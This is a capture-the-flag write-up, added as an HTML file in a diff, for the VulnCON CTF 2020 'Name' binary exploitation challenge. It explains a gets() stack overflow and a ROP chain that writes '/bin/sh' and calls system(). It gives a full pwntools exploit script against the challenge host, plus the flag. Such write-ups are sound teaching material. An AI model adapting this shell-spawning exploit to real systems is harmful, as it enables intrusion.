@@ -1,0 +1,60 @@
+<!--Solve date: 12/19/2020-->
+
+<h1>VulnCON CTF 2020 - Name</h1>
+
+<h2>Binary Exploitation - 152 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Program Behavior</h5>
+
+<p>This program is very similar to the baby challenge - there is a vulnerable call to <code>gets()</code> to a buffer on the stack - except now there is a check on the buffer contents (notice that this does not affect our attack in any way), and, unfortunately, no convenient function that directly spawns a shell :)</p>
+
+<img class = "small" src = "./images/vulncon_name_1.png"/>
+
+<p class = "caption">Figure 1. Buffer overflow vulnerability in <code>main()</code>.</p>
+
+<h5>ROP Exploit</h5>
+
+<p>Since the stack is non-executable, we will have to ROP our way to a shell. In a typical exploit, because the target system usually has ASLR (address-space layout randomization) enabled, we will need to leak an address in libc with a ROP chain that calls <code>puts()</code> or <code>printf()</code>. However, note that this binary does not call either of these functions (the text is printed with <code>system("cat &lt;text to print&gt;")</code>). While this does eliminate the need to locate the address of <code>system()</code> (we can just call its address in the PLT), we still can't spawn a shell because we also need a pointer to the string <code>/bin/sh</code>.</p>
+
+<p>When a known string is not available to us, the natural question to ask next is whether we can generate this string ourselves. Since here we have access to <code>gets()</code>, we can. Simply find a writeable address, call <code>gets()</code>, and finally call <code>system()</code> with that address as argument. The program will again wait for our input, and by submitting <code>/bin/sh</code>, we will get a shell.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+
+from pwn import *
+
+ready = True
+
+if ready:
+    p = remote("13.233.134.24", 49153)
+else:
+    p = process("./name")
+    context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", '-e']
+#    gdb.attach(p)
+
+ret = 0x4007cc
+poprdi_ret = 0x400833
+system_plt = 0x4005d0
+writeable = 0x601048
+gets_plt = 0x400600
+
+p.recvuntil("Enter your name: ")
+payload = b"w3lc0m3"
+payload += (0x80 - len(payload)) * b'\x00'
+payload += p64(0xdeadbeef)
+payload += p64(poprdi_ret) + p64(writeable) + p64(gets_plt) + p64(poprdi_ret) + p64(writeable) + p64(system_plt)
+p.sendline(payload)
+
+p.sendline("/bin/sh")
+
+p.interactive()    
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>vulncon{wh3r3_d1d_y0u_g3t_b1nsh}</code></p>
